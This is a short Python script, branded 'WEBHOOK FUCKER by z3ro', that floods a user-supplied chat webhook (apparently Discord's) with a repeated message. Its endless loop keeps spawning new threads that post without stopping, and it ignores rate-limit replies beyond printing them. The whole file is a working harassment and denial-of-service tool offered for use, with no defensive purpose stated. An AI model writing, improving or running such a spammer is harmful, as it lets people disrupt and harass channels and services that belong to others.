import requests
import os
import sys
import time
import colorama
import json
import threading
from colorama import init, Fore, Style, Back

os.system('cls & mode 75,15 & title WEBHOOK FUCKER by z3ro')

print("")
print(Fore.RED + '		╔═╗ ╔═╗ ╦═╗ ╔═╗      ╔═╗ ╔═╗ ╔═╗ ╔╦╗ ╔╦╗ ╔═╗ ╦═╗')
print(Fore.RED + '		╔═╝ ║╣  ╠╦╝ ║ ║  ==  ╚═╗ ╠═╝ ╠═╣ ║║║ ║║║ ║╣  ╠╦╝')
print(Fore.RED + '		╚═╝ ╚═╝ ╩╚═ ╚═╝      ╚═╝ ╩   ╩ ╩ ╩ ╩ ╩ ╩ ╚═╝ ╩╚═')

MESSAGE = input('Message: ')
WEBHOOK_URL = input('Webhook: ')

def spam(MESSAGE, WEBHOOK_URL):
	while True:
		try:
			r = requests.post(WEBHOOK_URL, json={'content': MESSAGE})
			s = [200, 201, 204]
			if r.status_code in s:
				print(Fore.GREEN + f'{MESSAGE} > Sent!')
			elif r.status_code == 429:
				b = r.json()
				print(Fore.RED + f"Ratelimit reached, retrying in {b['retry_after']} seconds")

		except:
			print (Fore.RED + 'Webhook <' + WEBHOOK_URL + '> Not Found')
			time.sleep(5)
			exit()

def spamming():
	for i in range(2):
		threading.Thread(target=spam, args=(MESSAGE, WEBHOOK_URL,)).start()

spammed = 100

while spammed == 100:
	spamming()